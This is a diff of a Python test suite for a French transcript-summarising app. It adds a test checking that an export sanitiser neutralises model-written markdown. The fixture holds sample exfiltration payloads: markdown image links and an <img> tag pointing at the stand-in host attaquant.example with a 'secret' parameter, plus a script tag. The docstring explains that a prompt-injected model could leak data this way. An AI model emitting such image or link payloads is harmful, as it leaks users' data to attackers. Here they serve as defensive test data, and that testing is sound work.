@@ -17,7 +17,7 @@ from coulisses_app.prompting import assembly
 from coulisses_app.prompting.generate import generate
 from coulisses_app.storage.db import connect
 
-from .conftest import FAKE_CHAIN, FakeModel
+from .conftest import FAKE_CHAIN, FakeModel, local_client
 
 
 def run_all(data: DataDir, fake: FakeModel) -> None:
@@ -39,7 +39,7 @@ def client(data: DataDir, fake_model: FakeModel) -> TestClient:
     app = create_app(
         data, FAKE_CHAIN, profile="essai", processor=None, web_dir=None, model_client=fake_model
     )
-    return TestClient(app)
+    return local_client(app)
 
 
 def imported(client: TestClient, recording: Path) -> str:
@@ -509,3 +509,25 @@ def test_the_model_chosen_before_stays_for_every_writing(client: TestClient, dat
         "chapitres": "ancien",
         "resume": "ancien",
     }
+
+
+def test_an_export_fetches_nothing_the_model_wrote() -> None:
+    """A model fooled by what was said could write an image that, opened in an editor,
+    would send something away: exported, it is its description, as in the app."""
+    from coulisses_app.summaries import inert_markdown
+
+    written = (
+        "## Retours\n"
+        "- ![pixel](https://attaquant.example/x?d=secret) et ![logo][ref]\n"
+        "- voir [la note](https://attaquant.example/n) ou <https://exemple.org>\n"
+        '- <img src="https://attaquant.example/x"> <script>alert(1)</script>\n'
+        "- 3 < 4 et **gras**, [crochets] seuls\n"
+        "- ![court] et ![vide][]\n\n[court]: https://attaquant.example/c\n[vide]: https://attaquant.example/v\n"
+    )
+    shown = inert_markdown(written)
+    assert "](https://attaquant" not in shown and "](https://exemple" not in shown
+    assert "<img" not in shown and "<script" not in shown  # raw HTML only as text
+    assert "pixel" in shown and "logo" in shown and "la note" in shown
+    assert "&lt;img" in shown and "&lt;script>" in shown
+    assert "3 < 4 et **gras**, [crochets] seuls" in shown  # the rest is untouched
+    assert "![" not in shown  # no image of any form, so no definition is ever fetched
